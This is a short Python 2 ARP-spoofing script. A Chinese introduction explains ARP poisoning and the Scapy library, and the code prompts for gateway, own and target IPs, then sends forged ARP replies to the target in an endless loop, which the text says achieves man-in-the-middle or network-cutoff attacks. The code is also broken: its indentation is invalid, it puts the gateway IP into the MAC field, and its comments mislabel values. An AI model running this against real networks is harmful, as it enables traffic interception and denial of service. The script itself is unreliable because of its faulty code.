'''
arp攻击原理：通过伪造IP地址与MAC地址实现ARP欺骗，在网络发送大量ARP通信量。攻击者

只要持续不断发送arp包就能造成中间人攻击或者断网攻击。（PS:我们只需要scapy里的一些参数就可以实现）

scapy介绍：
Scapy是一个Python程序，使用户能够发送，嗅探和剖析和伪造网络数据包。此功能允许构建可以探测，扫描或攻击网络的工具。

换句话说，Scapy是一个功能强大的交互式数据包处理程序。它能够伪造或解码大量协议的数据包，在线上发送，捕获，匹配请求和回复等等。Scapy可以轻松处理大多数经典任务，如扫描，追踪，探测，单元测试，攻击或网络发现。它可以替代hping，arpspoof，arp-sk，arping，pf，甚至是Nmap，tcpdump和tshark的某些部分。scapy的一个小例子:

ps:scapy正确的食用手册请认真看完介绍和部分基础：https://phaethon.github.io/scapy/api/introduction.html
'''



import os
import sys
from scapy.layers.l2 import getmacbyip
from scapy.all import (
    Ether,
    ARP,
    sendp
)
    
#执行查看IP的命令
ifconfig=os.system('ifconfig')
print ifconfig
gmac=raw_input('Please enter gateway IP:')
liusheng=raw_input('Please enter your IP:')
liusrc=raw_input('Please enter target IP:')
try:
#获取目标的mac
    tg=getmacbyip(liusrc)
    print tg
except Exception , f:
print '[-]{}'.format(f)
exit()
def arpspoof():
    try:
eth=Ether()
arp=ARP(
    op="is-at", #arp响应
    hwsrc=gmac, #网关mac
    psrc=liusheng,#网关IP
    hwdst=tg,#目标Mac
    pdst=liusrc#目标IP
)
#对配置进行输出
print ((eth/arp).show())
#开始发包
sendp(eth/arp,inter=2,loop=1)
    except Exception ,g:
    print '[-]{}'.format(g)
    exit()
arpspoof()